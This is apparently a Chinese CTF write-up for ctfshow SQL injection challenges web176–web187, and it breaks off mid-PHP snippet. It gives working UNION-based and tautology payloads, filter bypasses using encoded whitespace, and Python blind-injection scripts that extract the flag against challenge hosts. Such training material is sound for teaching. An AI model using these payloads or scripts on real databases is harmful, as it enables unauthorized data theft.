<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union all <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">Select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'ctfshow_user'</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>查flag</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union all <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">Select</span> <span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username=<span class="string">'flag'</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>第二种方法简单——利用or的后面条件一直为真，可以显示所有数据</li>
</ul>
</blockquote>
<ul>
<li>查所有数据</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730101403056.png" alt="image-20210730101403056"></p>
<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><blockquote>
<ul>
<li>第一种方法判断过滤了空格，但是依旧可以用or通杀显示所有数据</li>
</ul>
</blockquote>
<p><strong>查flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'or(1=1)%23</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>第二种方法，这次发现还多过滤了空格，我们可以用<code>%0a</code>换行符或者注释符绕过(或者<code>%09,%0b,%0c,%0d</code>都可以)，这次我们用万能密码吧，用上面的也可以，不过绕过空格后有点长，后面的注释我们用<code>#</code>的url编码形式<code>%23</code></strong></li>
</ul>
</blockquote>
<p><strong>查flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'%09union%09select%091,2,(<span class="keyword">select</span>%<span class="number">09</span><span class="keyword">password</span>%<span class="number">09</span><span class="keyword">from</span>%<span class="number">09</span>ctfshow_user%<span class="number">09</span><span class="keyword">where</span>%<span class="number">09</span>username=<span class="string">'flag'</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><blockquote>
<ul>
<li><strong>和上题差不多，多办了/**/</strong>这个注释符号，也可以<strong>万能密码<code>1&#39;%09or%091=1%23</code></strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'%09union%09select%091,2,(<span class="keyword">select</span>%<span class="number">09</span><span class="keyword">password</span>%<span class="number">09</span><span class="keyword">from</span>%<span class="number">09</span>ctfshow_user%<span class="number">09</span><span class="keyword">where</span>%<span class="number">09</span>username=<span class="string">'flag'</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><blockquote>
<ul>
<li><strong>和上题差不多，过滤了<code>%09,%0b,%0d</code>和空格也可以用万能密码<code>1&#39;%0cor%0c1=1%23</code></strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'%0cunion%0cselect%0c1,2,(<span class="keyword">select</span>%<span class="number">0</span>cpassword%<span class="number">0</span>cfrom%<span class="number">0</span>cctfshow_user%<span class="number">0</span>cwhere%<span class="number">0</span>cusername=<span class="string">'flag'</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><blockquote>
<ul>
<li><strong>这题%23也过滤了，绕过空格的基本都过滤了，我们想着拼凑语句</strong></li>
</ul>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.1'or(id='26')and'1=1</span><br></pre></td></tr></table></figure></div>

<p>这个拼接之后的语句就是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username !=<span class="string">'flag'</span> <span class="keyword">and</span> <span class="keyword">id</span> = <span class="string">'1.1'</span><span class="keyword">or</span>(<span class="keyword">id</span>=<span class="string">'26'</span>)<span class="keyword">and</span><span class="string">'1=1’ limit 1;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id='1.1'or(id=26)and'1=1' limit 1;</span><br><span class="line">也就是</span><br><span class="line">(id='1.1') or ((id=26) and '1=1') limit 1;</span><br><span class="line">前面因为1.1不存在为0，后面为1，所以整个条件为1</span><br></pre></td></tr></table></figure></div>

<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.1'or(id=26)and'a'='a</span><br></pre></td></tr></table></figure></div>

<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.1'or(id=26)and'a'='a</span><br></pre></td></tr></table></figure></div>

<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = "<span class="keyword">select</span> <span class="keyword">count</span>(pass) <span class="keyword">from</span> <span class="string">".$_POST['tableName']."</span>;";</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>提示说拼接sql语句找到指定id，因为前几天他的表都是ctfshow_user，我们可以尝试一下这个表，然后用like和%进行模糊匹配</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>post传参</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730124155127.png" alt="image-20210730124155127"></p>
<ul>
<li><strong>这里明显有布尔盲注，来进行猜解flag，写一个py脚本</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://e9202b55-424f-460d-8597-692168ba560f.challenge.ctf.show:8080/select-waf.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line">flag = <span class="string">"ctfshow"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"tableName"</span>:<span class="string">"(ctfshow_user)where(pass)like'&#123;0&#125;%'"</span>.format(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">"$user_count = 1"</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730132558687.png" alt="image-20210730132558687"></p>
</blockquote>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><blockquote>
<ul>
<li><strong>这把过滤了where，我们用右连接来做</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow% 的十六进制 为 0x63746673686F7725</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>所以用他来匹配like,放出了空格</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686F7725</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>写个py来跑flag</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30 21:24</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment">#转十六进制</span></span><br><span class="line">    str_16 = binascii.b2a_hex(s.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    res = bytes.decode(str_16)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://d42dba7c-384e-4a5d-9a5d-26398d42ce7c.challenge.ctf.show:8080/select-waf.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line">flag = <span class="string">"ctfshow"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">     print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = <span class="string">"0x"</span> + to_hex(flag + j + <span class="string">"%"</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">             <span class="string">"tableName"</span>:<span class="string">"ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;"</span>.format(result)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"$user_count = 43"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686F7725</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730140931041.png" alt="image-20210730140931041"></p>
</blockquote>
<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><blockquote>
<ul>
<li>这次直接过滤了0-9的所有数字，上个脚本进行改变</li>
</ul>
</blockquote>
<p><strong>这次我们利用true来进行替换数字</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select true+true;</span><br><span class="line">结果是2</span><br><span class="line">所以我们构造数字c来进行like匹配</span><br></pre></td></tr></table></figure></div>

<p><strong>我们还是用like模糊匹配，然后利用concat连接true形成的字符和数字</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730151426812.png" alt="image-20210730151426812"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like concat(char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730151523656.png" alt="image-20210730151523656"></p>
<p><strong>页面可以正常回显，代码跑起py</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span><span class="params">(n)</span>:</span></span><br><span class="line">    num=<span class="string">'true'</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"true"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            num+=<span class="string">"+true"</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="comment">#把每一个字符转换成ascii码对应的数值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    str=<span class="string">""</span></span><br><span class="line">    str+=<span class="string">"char("</span>+createNum(ord(s[<span class="number">0</span>]))+<span class="string">")"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str+=<span class="string">",char("</span>+createNum(ord(i))+<span class="string">")"</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://e0482185-09dd-40c6-854f-6df23ac4c58b.challenge.ctf.show:8080/select-waf.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"ctfshow"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = change_str(flag + j + <span class="string">"%"</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"tableName"</span>:<span class="string">"ctfshow_user as a right join ctfshow_user as b on b.pass like (concat(&#123;&#125;))"</span>.format(result)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"$user_count = 43"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730153336499.png" alt="image-20210730153336499"></p>
<h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><blockquote>
<ul>
<li>和上一题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span><span class="params">(n)</span>:</span></span><br><span class="line">    num=<span class="string">'true'</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"true"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            num+=<span class="string">"+true"</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="comment">#把每一个字符转换成ascii码对应的数值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    str=<span class="string">""</span></span><br><span class="line">    str+=<span class="string">"char("</span>+createNum(ord(s[<span class="number">0</span>]))+<span class="string">")"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str+=<span class="string">",char("</span>+createNum(ord(i))+<span class="string">")"</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://e0482185-09dd-40c6-854f-6df23ac4c58b.challenge.ctf.show:8080/select-waf.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"ctfshow"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = change_str(flag + j + <span class="string">"%"</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"tableName"</span>:<span class="string">"ctfshow_user as a right join ctfshow_user as b on b.pass like (concat(&#123;&#125;))"</span>.format(result)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"$user_count = 43"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730154141902.png" alt="image-20210730154141902"></p>
</blockquote>
<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = md5($_POST[<span class="string">'password'</span>],<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>($username!=<span class="string">'admin'</span>)&#123;</span><br><span class="line">	$ret[<span class="string">'msg'</span>]=<span class="string">'用户名不存在'</span>;</span><br><span class="line">   <span 